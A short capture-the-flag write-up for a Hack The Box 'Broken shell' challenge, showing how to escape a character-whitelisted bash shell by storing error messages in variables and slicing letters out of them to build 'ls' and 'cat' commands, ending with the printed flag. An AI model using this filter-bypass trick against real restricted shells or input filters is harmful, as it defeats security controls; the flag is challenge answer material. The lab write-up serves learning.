# Broken shell writeup

## Solution Idea
- We are given a white listed , broken shell environment where all characters are prohibited as well < , > , * and many other characters .
- I have done some reaserch to find a starting poin t, my research led me to this (writeup)[https://jrb.nz/posts/bash-tricks/] , and it is exactly what i needed to know .
- I need to first find the flag's file name , for this , I generated the first error message and saved it in a variable that i named _1 : 
`Broken@Shell$  _1=$( /_ 2>&1 )`
- Next i needed to construct the command ls letter by letter :
`Broken@Shell$  ${_1:32:1}${_1:35:1}`
`1  broken_shell.sh  this_is_the_flag_gg`
- Here we have it and as expected , it cannot be something as simple as flag.txt xd
- Next , we save this output in another variable : 
`_2=${_1:32:1}${_1:35:1}`
- Abd we shall start construction the cat command , the problem is that i don't have the a letter so we need to find it , i made a mistake which -by far- is the best mistake i have made , it led to this error message having the a in it , so let's also save it in another varibale :
`_3=$(${_2:0:20} 2>&1 )`
- Now that we have all we need , we just need to construct our final command :
`${_1:12:1}${_3:32:1}${_1:9:1} ${_3:18:19}`
- Which translates to :
`cat this_is_the_flag_gg`
`This file contains the flag. The problem is that it is not on the first line so you have to read the whole file to get it :)`
`HTB{?y0u?4r3?4?tru3?b45h?3xp3rt}`

## Flag
- HTB{?y0u?4r3?4?tru3?b45h?3xp3rt}


